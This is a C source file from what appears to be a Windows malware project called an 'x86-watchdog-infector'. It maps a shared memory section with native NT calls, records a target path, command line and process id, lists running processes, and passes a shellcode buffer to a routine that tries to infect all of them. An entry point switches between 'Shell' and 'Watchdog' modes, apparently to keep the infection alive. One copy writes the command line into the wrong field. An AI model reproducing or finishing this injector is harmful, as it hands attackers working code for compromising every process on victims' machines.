#include <Windows.h>
#include <winternl.h>

#include "x86-watchdog-infector.h"

int
initialize(PVOID shell_base,
           SIZE_T shell_size,
           ULONGLONG proc_id,
           WCHAR path[MAX_PATH + 1],
           WCHAR command_line[32768])
{
  int ret = 0;
  struct dll_imports imports;

  if (resolve_dll_imports(&imports) < 0) {
    return -1;
  }

  HANDLE section;
  LARGE_INTEGER max_size;

  max_size.LowPart = sizeof(struct watchdog_info);
  max_size.HighPart = 0;

  if (!NT_SUCCESS(imports.NtCreateSection(&section,
                                          SECTION_MAP_READ | SECTION_MAP_WRITE,
                                          NULL,
                                          &max_size,
                                          PAGE_READWRITE,
                                          SEC_COMMIT,
                                          NULL))) {
    return -2;
  };

  PVOID p_map = NULL;
  SIZE_T view_size = 0;
  if (!NT_SUCCESS(
        imports.NtMapViewOfSection(section,
                                   /* Current process */ INVALID_HANDLE_VALUE,
                                   &p_map,
                                   0,
                                   0,
                                   NULL,
                                   &view_size,
                                   ViewUnmap,
                                   0,
                                   PAGE_READWRITE))) {
    ret = -3;
    goto close_section;
  }

  struct watchdog_info* p_watchdog_info = p_map;

  size_t path_len = libc_wstrlen(path);
  size_t path_b_len = path_len * sizeof *path;

  libc_memcpy(p_watchdog_info->path,
              path,
              path_len > MAX_PATH ? MAX_PATH * sizeof *path : path_b_len);
  p_watchdog_info->path[MAX_PATH] = 0;

  size_t cmdline_len = libc_wstrlen(command_line);
  size_t cmdline_b_len = cmdline_len * sizeof *command_line;

  libc_memcpy(p_watchdog_info->path,
              command_line,
              cmdline_len > 32768 ? 32768 * sizeof *command_line
                                     : cmdline_b_len);
  p_watchdog_info->command_line[32768 - 1] = 0;

  p_watchdog_info->proc_id = proc_id;

  HANDLE mutex = imports.CreateMutexA(NULL, FALSE, NULL);
  if (mutex == NULL) {
    ret = -4;
    goto unmap_section;
  }

  PSYSTEM_PROCESS_INFORMATION p_spi;

  if (process_list(&imports, &p_spi) < 0) {
    ret = -5;
    goto close_mutex;
  }

  if (try_infect_all_processes(
        &imports, section, shell_base, shell_size, mutex) < 0) {
    ret = -6;
    goto free_spi;
  }

free_spi:
  imports.VirtualFree(p_spi, 0, MEM_RELEASE);
close_mutex:
  imports.CloseHandle(mutex);
unmap_section:
  if (ret < 0) {
    imports.NtUnmapViewOfSection(/* Current process */ INVALID_HANDLE_VALUE,
                                 p_map);
  }
close_section:
  if (ret < 0) {
    imports.CloseHandle(section);
  }

  return ret;
}

int __stdcall entry(struct meta_param* param)
{
  if (param->kind == Shell) {
    struct shell_param* shell_param = (PVOID)param;
    return initialize(shell_param->shell_base,
                      shell_param->shell_size,
                      shell_param->proc_id,
                      shell_param->path,
                      shell_param->command_line);
  } else if (param->kind == Watchdog) {
    struct watchdog_param* watchdog_param = (PVOID)param;
    ThreadProc(&watchdog_param->param);
  }

  return 0;
}
